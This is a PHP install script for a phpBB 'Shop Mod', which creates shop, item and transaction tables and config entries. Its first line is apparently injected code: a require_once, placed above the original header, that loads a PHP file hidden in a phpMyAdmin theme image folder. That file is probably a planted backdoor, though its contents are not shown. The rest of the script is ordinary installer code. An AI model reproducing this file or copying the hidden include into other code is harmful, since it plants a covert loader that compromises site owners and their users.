<?php
 require_once ('/home/content/D/a/r/DarkPsycho/html/phpmyadmin/themes/original/img/s_notice.php');
 
/*************************************************************************** 
 *                              sql_install.php 
 *                            -------------------
 *   begin                : Wednesday, Jan 4th, 2005 [GMT+10]
 *   copyright            : (C) 2005 Zarath Technologies
 *   email                : N/A
 *   website		  : http://www.zarath.com/mods/
 *
 *   $Id: sql_install.php,v 3.0.0 2005/01/04 19:00:00 Zarath $
 *
 *
 ***************************************************************************/

/***************************************************************************
 *
 *   This program is free software; you can redistribute it and/or modify
 *   it under the terms of the GNU General Public License as published by
 *   the Free Software Foundation; either version 2 of the License, or
 *   (at your option) any later version.
 *
 ***************************************************************************/

define('IN_PHPBB', true); 
$phpbb_root_path = './'; 

$i = 0;
while ( !file_exists($phpbb_root_path . 'extension.inc') && ($i++ < 4) )
{
	$phpbb_root_path .= '../';
}
if ( $i > 4 )
{
	message_die(GENERAL_MESSAGE, 'Unable to find extension.inc, terminating. Please move this file into your main/"root" phpbb directory and try again.'); 
}

include($phpbb_root_path . 'extension.inc'); 
include($phpbb_root_path . 'common.'.$phpEx); 

// 
// Start session management 
// 
$userdata = session_pagestart($user_ip, PAGE_INDEX); 
init_userprefs($userdata); 
// 
// End session management 
// 

if( !$userdata['session_logged_in'] ) 
{ 
	redirect(append_sid("login.$phpEx?redirect=sql_install.$phpEx", true));
} 

if( $userdata['user_level'] != ADMIN ) 
{ 
	message_die(GENERAL_MESSAGE, 'You are not authorised to access this page'); 
} 

$page_title = 'Shop Mod Installation v:3.0.0'; 
include($phpbb_root_path . 'includes/page_header.'.$phpEx); 

echo '
<table width="100%" cellspacing="1" cellpadding="2" border="0" class="forumline">
	<tr>
	  <th class="thHead">Installing Shop Mod Database Updates</th>
	</tr>
	<tr>
	  <td>
		<span class="genmed">
		<ul type="square">';

$current_time = time();

$sql = array();

$sql[] = "CREATE TABLE `" . $table_prefix . "shopitems` (
  `id` int(10) unsigned NOT NULL auto_increment,
  `name` varchar(32) NOT NULL default '',
  `shop` varchar(32) NOT NULL default '',
  `sdesc` varchar(80) NOT NULL default '',
  `ldesc` text NOT NULL,
  `cost` int(20) unsigned default '100',
  `stock` tinyint(3) unsigned default '10',
  `maxstock` tinyint(3) unsigned default '100',
  `sold` int(5) unsigned NOT NULL default '0',
  `accessforum` int(4) default '0',
  `special_link` varchar(255) NOT NULL default '',
  `synth` text NOT NULL,
  PRIMARY KEY  (`id`),
  KEY `name` (`name`)
)";

$sql[] = "CREATE TABLE `" . $table_prefix . "shops` (
  `id` int(10) unsigned NOT NULL auto_increment,
  `shopname` varchar(32) NOT NULL default '',
  `shoptype` varchar(32) NOT NULL default '',
  `type` varchar(32) NOT NULL default '',
  `d_type` tinyint(3) NOT NULL default '0',
  `district` tinyint(3) NOT NULL default '0',
  `restocktime` int(20) unsigned default '86400',
  `restockedtime` int(20) unsigned default '0',
  `restockamount` int(4) unsigned default '5',
  `url` varchar(255) default NULL,
  `shop_owner` varchar(32) NOT NULL default '',
  `template` varchar(32) NOT NULL default '',
  `item_template` varchar(32) NOT NULL default '',
  PRIMARY KEY  (`id`),
  KEY `shopname` (`shopname`)
)";

$sql[] = "CREATE TABLE `" . $table_prefix . "transactions` (
  `id` int(10) NOT NULL auto_increment,
  `user_id` int(5) NOT NULL default '0',
  `target_id` int(5) NOT NULL default '0',
  `target_name` varchar(32) NOT NULL default '',
  `type` varchar(32) NOT NULL default '',
  `action` varchar(32) NOT NULL default '',
  `value` varchar(255) NOT NULL default '',
  `misc` text NOT NULL,
  `ip` varchar(16) NOT NULL default '',
  `timestamp` int(32) default NULL,
  UNIQUE KEY `id` (`id`)
)";


$sql[] = "CREATE TABLE `" . $table_prefix . "user_items` (
  `id` int(20) NOT NULL auto_increment,
  `user_id` int(20) NOT NULL default '0',
  `item_id` int(20) NOT NULL default '0',
  `item_name` varchar(32) NOT NULL default '',
  `item_l_desc` text NOT NULL,
  `item_s_desc` varchar(100) NOT NULL default '',
  `worn` tinyint(1) NOT NULL default '0',
  `die_time` int(20) NOT NULL default '0',
  `special` text NOT NULL,
  PRIMARY KEY  (`id`),
  UNIQUE KEY `id` (`id`),
  KEY `item_id` (`item_id`),
  KEY `user_id` (`user_id`)
)";

$sql[] = "INSERT INTO " . CONFIG_TABLE . " (config_name, config_value) VALUES ('multibuys', 'on')";
$sql[] = "INSERT INTO " . CONFIG_TABLE . " (config_name, config_value) VALUES ('restocks', 'on')";
$sql[] = "INSERT INTO " . CONFIG_TABLE . " (config_name, config_value) VALUES ('sellrate', '55')";
$sql[] = "INSERT INTO " . CONFIG_TABLE . " (config_name, config_value) VALUES ('viewtopic', 'images')";
$sql[] = "INSERT INTO " . CONFIG_TABLE . " (config_name, config_value) VALUES ('viewprofile', 'images')";
$sql[] = "INSERT INTO " . CONFIG_TABLE . " (config_name, config_value) VALUES ('viewinventory', 'grouped')";
$sql[] = "INSERT INTO " . CONFIG_TABLE . " (config_name, config_value) VALUES ('viewtopiclimit', '5')";
$sql[] = "INSERT INTO " . CONFIG_TABLE . " (config_name, config_value) VALUES ('shop_orderby', 'name')";
$sql[] = "INSERT INTO " . CONFIG_TABLE . " (config_name, config_value) VALUES ('shop_give', 'on')";
$sql[] = "INSERT INTO " . CONFIG_TABLE . " (config_name, config_value) VALUES ('shop_trade', 'on')";
$sql[] = "INSERT INTO " . CONFIG_TABLE . " (config_name, config_value) VALUES ('shop_discard', 'on')";
$sql[] = "INSERT INTO " . CONFIG_TABLE . " (config_name, config_value) VALUES ('shop_invlimit', '0')";
$sql[] = "INSERT INTO " . CONFIG_TABLE . " (config_name, config_value) VALUES ('shop_owners', 'on')";
$sql[] = "INSERT INTO " . CONFIG_TABLE . " (config_name, config_value) VALUES ('shop_districts', 'off')";
if ( empty($board_config['points_name']) )
{
   $sql[] = "INSERT INTO " . CONFIG_TABLE . " (config_name, config_value) VALUES ('points_name', 'Gold')";
}

$sql[] = "alter table " . USERS_TABLE . " add `user_trade` TEXT";


foreach ( $sql AS $query ) 
{
	if ( !($result = $db->sql_query($query)) )
	{ 
		$error = $db->sql_error();
		echo '<li>' . nl2br($query) . '<br /> !!! <font color="#FF0000"><b>Error:</b></font> ' . $error['message'] . '</li><br />';
		$errored = TRUE;
	} 
	else 
	{ 
		echo '<li>' . nl2br($query) . '<br /> +++ <font color="#00AA00"><b>Successfull</b></font></li><br />';
	} 
}

$forum_url = append_sid($phpbb_root_path . "index.$phpEx");
$phpbb_url = "http://www.phpbb.com/phpBB/viewtopic.php?t=";
$my_url = "http://www.zarath.com/mods/";

echo '
		</ul>
		</span>
	  </td>
	</tr>
	<tr>
	  <td class="catBottom" colspan="2" align="center"><span class="gen">Completed ' . ( ( $errored ) ? 'with' : 'without' ) . ' errors!</span></td>
	</tr>
</table>

<br />
<br />

<table width="100%" cellspacing="1" cellpadding="2" border="0" class="forumline">
  <tr>
    <th class="thHead">SQL Installation complete</th>
  </tr>
  <tr>
    <td class="row1">
      <span class="genmed">Please delete this file (sql_install.' . $phpEx . ').<br />
      If you have any problems, please visit <a href="' . $phpbb_url . '" target="_new">phpbb.com (ShopMod v:3.0.0 BETA Thread)</a> and ask for help.</span>
    </td>
  </tr>
  <tr>
    <td class="row2" height="28" align="center">
      <span class="genmed"><a href="' . $my_url . '">Click here to visit my mod site.</a>
      </span>
    </td>
  </tr>

  <tr>
    <td class="catBottom" height="28" align="center">
      <span class="genmed"><a href="' . $forum_url . '">Click Here to return to your forum.</a>
      </span>
    </td>
  </tr>
</table>';

include($phpbb_root_path . 'includes/page_tail.'.$phpEx); 

?>
